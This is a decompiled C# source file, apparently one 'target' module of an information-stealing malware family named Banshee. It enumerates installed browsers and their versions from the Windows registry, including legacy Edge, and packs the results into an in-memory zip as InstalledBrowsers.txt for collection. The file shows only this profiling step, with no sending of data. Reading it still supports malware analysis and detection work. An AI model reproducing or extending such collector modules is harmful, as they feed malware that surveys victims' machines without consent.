﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using Banshee.Helper.Data;
using Microsoft.Win32;

namespace Banshee.Targets.Device
{
	// Token: 0x02000051 RID: 81
	public class InstalledBrowsers : ITarget
	{
		// Token: 0x060000B8 RID: 184 RVA: 0x00006644 File Offset: 0x00006644
		public void Collect(InMemoryZip zip, Counter counter)
		{
			List<InstalledBrowsers.Browser> list = (from g in InstalledBrowsers.GetBrowsers().GroupBy((InstalledBrowsers.Browser b) => b.Name, StringComparer.OrdinalIgnoreCase)
			select g.First<InstalledBrowsers.Browser>()).ToList<InstalledBrowsers.Browser>();
			int maxName = Math.Max("Name".Length, list.Max((InstalledBrowsers.Browser b) => b.Name.Length));
			int maxVersion = Math.Max("Version".Length, list.Max((InstalledBrowsers.Browser b) => b.Version.Length));
			int length = "In Use".Length;
			List<string> list2 = new List<string>
			{
				"Name".PadRight(maxName) + " | " + "Version".PadRight(maxVersion),
				new string('-', maxName + maxVersion + length + 6)
			};
			list2.AddRange(list.Select(delegate(InstalledBrowsers.Browser b)
			{
				InstalledBrowsers.SafeGetExeName(b.Path);
				return b.Name.PadRight(maxName) + " | " + b.Version.PadRight(maxVersion);
			}));
			if (list.Count > 0)
			{
				zip.AddTextFile("InstalledBrowsers.txt", string.Join("\n", list2));
			}
		}

		// Token: 0x060000B9 RID: 185 RVA: 0x000067BC File Offset: 0x000067BC
		private static IEnumerable<InstalledBrowsers.Browser> GetBrowsers()
		{
			string[] array = new string[]
			{
				"SOFTWARE\\WOW6432Node\\Clients\\StartMenuInternet",
				"SOFTWARE\\Clients\\StartMenuInternet"
			};
			List<InstalledBrowsers.Browser> list = new List<InstalledBrowsers.Browser>();
			foreach (string keyPath in array)
			{
				list.AddRange(InstalledBrowsers.GetBrowsersFromRegistry(keyPath, Registry.LocalMachine));
				list.AddRange(InstalledBrowsers.GetBrowsersFromRegistry(keyPath, Registry.CurrentUser));
			}
			InstalledBrowsers.Browser edgeLegacyVersion = InstalledBrowsers.GetEdgeLegacyVersion();
			if (edgeLegacyVersion != null)
			{
				list.Add(edgeLegacyVersion);
			}
			return list;
		}

		// Token: 0x060000BA RID: 186 RVA: 0x0000682E File Offset: 0x0000682E
		private static IEnumerable<InstalledBrowsers.Browser> GetBrowsersFromRegistry(string keyPath, RegistryKey root)
		{
			InstalledBrowsers.<GetBrowsersFromRegistry>d__3 <GetBrowsersFromRegistry>d__ = new InstalledBrowsers.<GetBrowsersFromRegistry>d__3(-2);
			<GetBrowsersFromRegistry>d__.<>3__keyPath = keyPath;
			<GetBrowsersFromRegistry>d__.<>3__root = root;
			return <GetBrowsersFromRegistry>d__;
		}

		// Token: 0x060000BB RID: 187 RVA: 0x00006848 File Offset: 0x00006848
		private static InstalledBrowsers.Browser GetEdgeLegacyVersion()
		{
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\CurrentVersion\\AppModel\\SystemAppData\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\Schemas"))
			{
				string text = ((registryKey != null) ? registryKey.GetValue("PackageFullName") : null) as string;
				if (text != null)
				{
					Match match = Regex.Match(text, "\\d+(\\.\\d+)+");
					if (match.Success)
					{
						return new InstalledBrowsers.Browser
						{
							Name = "Microsoft Edge (Legacy)",
							Path = null,
							Version = match.Value
						};
					}
				}
			}
			return null;
		}

		// Token: 0x060000BC RID: 188 RVA: 0x000068D8 File Offset: 0x000068D8
		private static string StripQuotesFromCommand(string command)
		{
			if (string.IsNullOrWhiteSpace(command))
			{
				return null;
			}
			command = command.Trim();
			if (command.StartsWith("\""))
			{
				int num = command.IndexOf('"', 1);
				if (num > 1)
				{
					return command.Substring(1, num - 1);
				}
				return null;
			}
			else
			{
				int num2 = command.IndexOf(' ');
				if (num2 <= 0)
				{
					return command;
				}
				return command.Substring(0, num2);
			}
		}

		// Token: 0x060000BD RID: 189 RVA: 0x00006938 File Offset: 0x00006938
		private static string SafeGetExeName(string path)
		{
			string result;
			try
			{
				if (string.IsNullOrWhiteSpace(path))
				{
					result = null;
				}
				else
				{
					string fileName = Path.GetFileName(path);
					result = ((fileName != null) ? fileName.ToUpperInvariant() : null);
				}
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x02000052 RID: 82
		private class Browser
		{
			// Token: 0x1700000A RID: 10
			// (get) Token: 0x060000BF RID: 191 RVA: 0x0000697C File Offset: 0x0000697C
			// (set) Token: 0x060000C0 RID: 192 RVA: 0x00006984 File Offset: 0x00006984
			public string Name { get; set; }

			// Token: 0x1700000B RID: 11
			// (get) Token: 0x060000C1 RID: 193 RVA: 0x0000698D File Offset: 0x0000698D
			// (set) Token: 0x060000C2 RID: 194 RVA: 0x00006995 File Offset: 0x00006995
			public string Path { get; set; }

			// Token: 0x1700000C RID: 12
			// (get) Token: 0x060000C3 RID: 195 RVA: 0x0000699E File Offset: 0x0000699E
			// (set) Token: 0x060000C4 RID: 196 RVA: 0x000069A6 File Offset: 0x000069A6
			public string Version { get; set; }
		}
	}
}
